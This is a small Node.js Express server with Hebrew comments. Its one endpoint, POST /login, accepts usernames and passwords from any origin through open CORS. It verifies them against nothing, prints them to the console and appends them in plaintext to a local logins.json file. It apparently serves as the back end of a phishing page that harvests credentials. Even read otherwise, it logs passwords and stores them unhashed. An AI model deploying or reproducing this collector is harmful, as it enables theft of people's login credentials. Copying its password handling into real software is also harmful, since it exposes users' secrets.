const express = require("express");
const cors = require("cors");  // ייבוא הספרייה
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors()); // שימוש ב-cors כדי לאפשר בקשות מכל דומיין
app.use(express.json());

// נקודת קצה לקבלת נתוני ההתחברות ושמירתם
app.post("/login", (req, res) => {
    const { username, password } = req.body;
    
    const loginData = {
        username,
        password,
        timestamp: new Date().toISOString()
    };
    console.log(loginData);
    
    fs.readFile("logins.json", "utf8", (err, data) => {
        let logins = [];
        
        if (!err && data) {
            logins = JSON.parse(data);
        }
        
        logins.push(loginData);
        
        fs.writeFile("logins.json", JSON.stringify(logins, null, 2), (err) => {
            if (err) {
                console.error("שגיאה בשמירת הנתונים:", err);
                return res.status(500).json({ message: "שגיאה בשמירה" });
            }
            res.json({ message: "הנתונים נשמרו בהצלחה" });
        });
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
